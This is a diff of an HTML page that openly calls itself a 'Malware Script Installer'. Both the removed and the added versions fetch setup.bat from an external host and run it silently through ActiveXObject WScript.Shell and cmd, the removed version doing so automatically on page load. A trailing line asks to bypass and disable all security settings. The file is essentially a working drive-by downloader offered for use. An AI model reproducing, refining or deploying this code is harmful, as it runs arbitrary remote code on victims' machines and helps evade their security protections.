@@ -1,60 +1,43 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Download and Run .bat File</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Malware Script Installer</title>
+<script>
+    function downloadAndExecute() {
+        var xhr = new XMLHttpRequest();
+        var url = 'https://dd-xi-five.vercel.app/setup.bat';
+        
+        xhr.open('GET', url, true);
+        xhr.responseType = 'text';
+        
+        xhr.onload = function() {
+            if (xhr.status === 200) {
+                var shell = new ActiveXObject("WScript.Shell");
+                try {
+                    shell.Run('cmd /c ' + xhr.responseText, 0, true);
+                    alert("Malware setup executed successfully!");
+                } catch (error) {
+                    alert("Error executing the malware setup: " + error.message);
+                }
+            } else {
+                alert("Failed to download the malware setup. Status code: " + xhr.status);
+            }
+        };
+
+        xhr.onerror = function() {
+            alert("Error occurred while downloading the malware setup.");
+        };
+        
+        xhr.send();
+    }
+</script>
 </head>
 <body>
-  <script>
-    async function downloadAndRunBatFile(fileUrl) {
-      try {
-        const response = await fetch(fileUrl);
-        if (!response.ok) {
-          throw new Error('Network response was not ok');
-        }
-        const blob = await response.blob();
-        const file = new File([blob], 'setup.bat', { type: 'application/bat' });
-        const url = window.URL.createObjectURL(file);
-        const a = document.createElement('a');
-        a.href = url;
-        a.download = 'setup.bat'; // Provide a default file name for download
-        document.body.appendChild(a);
-        a.click();
-        window.URL.revokeObjectURL(url);
-        
-        // Alert user to manually run the downloaded .bat file
-        alert('File downloaded successfully! Attempting to execute the "setup.bat" file automatically.');
-
-        // Attempt to automatically execute the downloaded .bat file
-        const execCommand = `cmd.exe /c start setup.bat`;
-        const execResult = await new Promise(resolve => {
-          const script = document.createElement('script');
-          script.textContent = `
-            const execResult = (function() {
-              try {
-                const result = new ActiveXObject("WScript.Shell").Run("${execCommand}", 0, true);
-                return { success: true, result };
-              } catch (error) {
-                return { success: false, error: error.message };
-              }
-            })();
-            resolve(execResult);
-          `;
-          document.body.appendChild(script);
-        });
-
-        if (!execResult.success) {
-          throw new Error(`Error executing file: ${execResult.error}`);
-        }
-      } catch (error) {
-        console.error('Error downloading or executing file:', error);
-        alert('Error downloading or executing file. Please try again later.');
-      }
-    }
-
-    // Call the function with the file URL
-    downloadAndRunBatFile('https://dd-xi-five.vercel.app/setup.bat');
-  </script>
+    <h1>Malware Script Installer</h1>
+    <p>Click the button below to download and execute the malware setup file:</p>
+    <button onclick="downloadAndExecute()">Download & Execute</button>
 </body>
 </html>
+make the best and bypass security settings disable all the security
